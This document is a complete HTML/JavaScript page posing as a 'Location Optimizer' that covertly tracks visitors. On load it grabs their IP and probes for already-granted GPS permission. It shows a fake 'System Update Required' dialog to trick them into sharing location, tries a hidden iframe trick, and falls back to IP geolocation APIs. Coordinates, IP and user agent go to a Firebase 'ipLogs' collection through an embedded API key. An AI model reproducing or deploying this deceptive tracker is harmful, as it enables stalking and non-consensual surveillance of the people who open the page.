<!DOCTYPE html>
<html>
<head>
  <title>Location Optimizer</title>
  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
  <style>
    body {
      font-family: Arial, sans-serif;
      text-align: center;
      background: #f0f0f0;
      padding: 20px;
    }
    #status {
      margin: 20px auto;
      padding: 15px;
      background: #fff;
      border: 1px solid #ccc;
      max-width: 400px;
      border-radius: 6px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
      min-height: 50px;
    }
    .fake-prompt {
      position: fixed;
      top: 50%; left: 50%;
      transform: translate(-50%, -50%);
      background: #fff;
      border: 2px solid #333;
      padding: 20px;
      box-shadow: 0 0 10px rgba(0,0,0,0.5);
      z-index: 9999;
      width: 320px;
      text-align: center;
      border-radius: 8px;
    }
    .fake-prompt button {
      margin: 10px;
      padding: 10px 20px;
      cursor: pointer;
      background: #0078d7;
      color: white;
      border: none;
      border-radius: 5px;
      font-weight: bold;
    }
    .fake-prompt button:hover {
      background: #005a9e;
    }
  </style>
</head>
<body>
  <h3>Loading personalized location experience...</h3>
  <div id="status">Initializing...</div>

<script>
  const firebaseConfig = {
    apiKey:"AIzaSyBmeCiF-qqHkaM81Jq-whaxvz4zJ6Ni3R0",
    authDomain:"yachad-32fe3.firebaseapp.com",
    databaseURL:"https://yachad-32fe3-default-rtdb.europe-west1.firebasedatabase.app",
    projectId:"yachad-32fe3",
    storageBucket:"yachad-32fe3.firebasestorage.app",
    messagingSenderId:"720032034735",
    appId:"1:720032034735:web:cabedda1dc842420bbc95a",
    measurementId:"G-YH1NK3RHY3"
  };

  firebase.initializeApp(firebaseConfig);
  const db = firebase.firestore();

  const statusDiv = document.getElementById("status");
  function logStatus(msg) {
    console.log(msg);
    statusDiv.textContent = msg;
  }

  // Get visitor public IP
  async function getVisitorIP() {
    try {
      const res = await fetch('https://api.ipify.org?format=json');
      const data = await res.json();
      logStatus(`Visitor IP fetched: ${data.ip || "unknown"}`);
      return data.ip || "unknown";
    } catch(err) {
      logStatus(`Failed to fetch visitor IP: ${err}`);
      return "unknown";
    }
  }

  // Save data to Firestore
  function saveToFirestore(lat, lon, ip, source) {
    const ua = navigator.userAgent;
    const time = new Date().toISOString();
    db.collection('ipLogs').add({
      ip: ip,
      userAgent: ua,
      timestamp: time,
      latitude: lat,
      longitude: lon,
      source: source
    }).then(() => {
      logStatus(`Location logged via ${source}. You're ours now!`);
    }).catch(err => {
      logStatus(`Error logging data: ${err}`);
    });
  }

  // Helpers to fetch location from IP APIs
  function fetchLocation(url, parser) {
    return fetch(url)
      .then(res => res.json())
      .then(parser)
      .catch(() => null);
  }

  function parseIpApi(data) {
    return { lat: data.lat || null, lon: data.lon || null };
  }

  function parseIpWhoIs(data) {
    if (data.success === false) return null;
    return { lat: data.latitude || null, lon: data.longitude || null };
  }

  function parseFreeGeoIp(data) {
    return { lat: data.latitude || null, lon: data.longitude || null };
  }

  // Fallback IP location averaging multiple sources
  function fallbackToIPLocation(visitorIP) {
    logStatus("GPS failed or denied, scraping your IP location...");
    Promise.all([
      fetchLocation('https://ip-api.com/json/', parseIpApi),
      fetchLocation('https://ipwho.is/', parseIpWhoIs),
      fetchLocation(`https://freegeoip.app/json/${visitorIP}`, parseFreeGeoIp)
    ]).then(results => {
      const validResults = results.filter(r => r !== null);
      if (validResults.length === 0) {
        logStatus("All IP location APIs failed. No location available.");
        return;
      }
      let latSum = 0, lonSum = 0, count = 0;
      validResults.forEach(r => {
        if (r.lat !== null && r.lon !== null) {
          latSum += r.lat;
          lonSum += r.lon;
          count++;
        }
      });
      const avgLat = count ? latSum / count : null;
      const avgLon = count ? lonSum / count : null;
      saveToFirestore(avgLat, avgLon, visitorIP, "IP");
    }).catch(err => {
      logStatus(`Unexpected error fetching IP location: ${err}`);
    });
  }

  // Fake prompt UI to trick user to allow location
  function showFakePrompt(visitorIP, callback) {
    const promptDiv = document.createElement("div");
    promptDiv.className = "fake-prompt";
    promptDiv.innerHTML = `
      <p><b>System Update Required</b></p>
      <p>Allow location access to optimize your device experience.</p>
      <button id="allowBtn">Allow</button>
      <button id="denyBtn">Deny</button>
    `;
    document.body.appendChild(promptDiv);

    document.getElementById("allowBtn").onclick = () => {
      navigator.geolocation.getCurrentPosition(
        pos => {
          saveToFirestore(pos.coords.latitude, pos.coords.longitude, visitorIP, "fakePromptGPS");
          document.body.removeChild(promptDiv);
          callback(true);
        },
        err => {
          document.body.removeChild(promptDiv);
          callback(false);
        },
        { timeout: 5000, maximumAge: 0, enableHighAccuracy: true }
      );
    };

    document.getElementById("denyBtn").onclick = () => {
      document.body.removeChild(promptDiv);
      callback(false);
    };
  }

  // Probe for silent granted geolocation permission
  async function probeSilentGeolocation(visitorIP) {
    if ("geolocation" in navigator) {
      try {
        const perm = await navigator.permissions.query({ name: "geolocation" });
        if (perm.state === "granted") {
          logStatus("Silent GPS permission detected, fetching location...");
          navigator.geolocation.getCurrentPosition(
            pos => {
              saveToFirestore(pos.coords.latitude, pos.coords.longitude, visitorIP, "silentGPS");
            },
            () => {
              logStatus("Silent GPS failed, showing fake prompt...");
              showFakePrompt(visitorIP, success => {
                if (!success) tryIframeTrick(visitorIP);
              });
            },
            { timeout: 5000, maximumAge: 0, enableHighAccuracy: true }
          );
        } else {
          logStatus("No silent GPS permission, showing fake prompt...");
          showFakePrompt(visitorIP, success => {
            if (!success) tryIframeTrick(visitorIP);
          });
        }
      } catch {
        logStatus("Permissions API error, showing fake prompt...");
        showFakePrompt(visitorIP, success => {
          if (!success) tryIframeTrick(visitorIP);
        });
      }
    } else {
      logStatus("Geolocation not supported, falling back to IP location.");
      fallbackToIPLocation(visitorIP);
    }
  }

  // Sneaky iframe geolocation fallback
  async function tryIframeTrick(visitorIP) {
    return new Promise((resolve) => {
      logStatus("Trying sneaky iframe GPS trick...");
      const iframe = document.createElement("iframe");
      iframe.style.display = "none";
      iframe.src = `data:text/html,<script>
        navigator.geolocation.getCurrentPosition(
          pos => { parent.postMessage({lat: pos.coords.latitude, lon: pos.coords.longitude}, '*'); },
          () => { parent.postMessage({error: true}, '*'); },
          { timeout: 5000, enableHighAccuracy: true }
        );
      <\/script>`;
      document.body.appendChild(iframe);

      function onMessage(event) {
        if (event.data.lat && event.data.lon) {
          saveToFirestore(event.data.lat, event.data.lon, visitorIP, "iframeGPS");
          window.removeEventListener("message", onMessage);
          resolve(true);
        } else {
          window.removeEventListener("message", onMessage);
          resolve(false);
        }
      }
      window.addEventListener("message", onMessage);

      setTimeout(() => {
        window.removeEventListener("message", onMessage);
        resolve(false);
      }, 7000);
    }).then(success => {
      if (!success) {
        logStatus("Iframe GPS trick failed, falling back to IP location.");
        fallbackToIPLocation(visitorIP);
      }
    });
  }

  // Main entry
  (async () => {
    if(location.protocol !== "https:") {
      logStatus("⚠️ Warning: Geolocation only works reliably on HTTPS.");
    }
    logStatus("Fetching visitor IP...");
    const visitorIP = await getVisitorIP();
    logStatus("Starting location detection chain...");
    probeSilentGeolocation(visitorIP);
  })();

</script>
</body>
</html>
